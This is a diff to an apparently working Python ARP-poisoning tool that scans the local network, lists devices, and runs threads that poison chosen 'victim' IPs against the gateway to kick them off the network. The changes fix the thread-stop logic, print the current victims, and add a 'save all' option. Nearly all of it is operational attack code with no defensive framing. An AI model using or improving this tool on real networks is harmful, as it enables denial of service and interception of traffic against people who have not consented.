@@ -42,7 +42,7 @@ def get_lan_ip():
 def printdiv():
   print ('\n--------------------')
 
-def refresh():
+def refresh(threads):
   myip = get_lan_ip()
   ip_list = myip.split('.')
 
@@ -58,8 +58,8 @@ def refresh():
   devices = get_ip_macs(ip_range)
   gateway_mac = '12:34:56:78:9A:BC'
 
-  printdiv()
-  print ("Connected ips:\n")
+  #printdiv()
+  print ("\nConnected ips:\n")
   i = 0
   for device in devices:
     print ('%s)\t%s\t%s' % (i, device[0], device[1]))
@@ -67,6 +67,11 @@ def refresh():
     if device[0] == gateway_ip:
       gateway_mac = device[1]
     i+=1
+  
+  print ("\nVictims ips:\n")
+  for victim in threads:
+    victim_ip, victim_mac = victim.getInfo()
+    print ('%s)\t%s\t%s' % (i, victim_ip, victim_mac))
 
   return devices, gateway_ip, gateway_mac
 
@@ -83,14 +88,14 @@ class DeviceThread(Thread):
             
   def run(self):
     try:
-      while self.stop_thread:
+      while not self.stop_thread:
         poison(self.victim_ip, self.victim_mac, self.gateway_ip)
       restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
     finally:
       print('Ended')
   
   def stop(self):
-    self.stop_thread = False
+    self.stop_thread = True
 
   def getInfo(self):
     return self.victim_ip, self.victim_mac
@@ -110,12 +115,10 @@ if (my_os != 'Windows' and os.geteuid() != 0):
 refreshing = True
 gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address
 
-#os.system(clear_command)
-
-devices, gateway_ip, gateway_mac = refresh()
-choice = input("\nWho do you want to boot? (r - Refresh, a - Kill all, q - Quit, s - Save, sa - Save All) > ")
-
 threads = []
+os.system(clear_command)
+devices, gateway_ip, gateway_mac = refresh(threads)
+choice = input("\nWho do you want to boot? (a - Kill all, q - Quit, s - Save, sa - Save All) > ")
 
 while choice != 'q':
   # Once we have a valid choice, we decide what we're going to do with it
@@ -138,18 +141,24 @@ while choice != 'q':
       for i in range(len(threads)):
         ip, mac = threads[i].getInfo()
         print ('%s)\t%s\t%s' % (i, ip, mac))
-      saved_victim = input()
-      victim_thread = threads[int(saved_victim)]
+      saved_victim = int(input())
+      victim_thread = threads[saved_victim]
       victim_thread.stop()
-      print('Saved victim: ' + str(threads[int(saved_victim)].getInfo()))
+      del threads[saved_victim]
     else:
       print("There aren't victims threads!")
-  
-  elif choice == 'r':
-    #os.system(clear_command)
-    devices, gateway_ip, gateway_mac = refresh()
 
-  choice = input("\nWho do you want to boot? (r - Refresh, a - Kill all, q - Quit, s - Save) > ")
+  elif choice == 'sa':
+    if (len(threads) > 0):
+      for thread in threads:
+        thread.stop()
+      threads = []
+    else:
+      print("There aren't victims threads!")
+
+  os.system(clear_command)
+  devices, gateway_ip, gateway_mac = refresh(threads)
+  choice = input("\nWho do you want to boot? (a - Kill all, q - Quit, s - Save, sa - Save All) > ")
 
 
 print ('\nYou\'re welcome!')
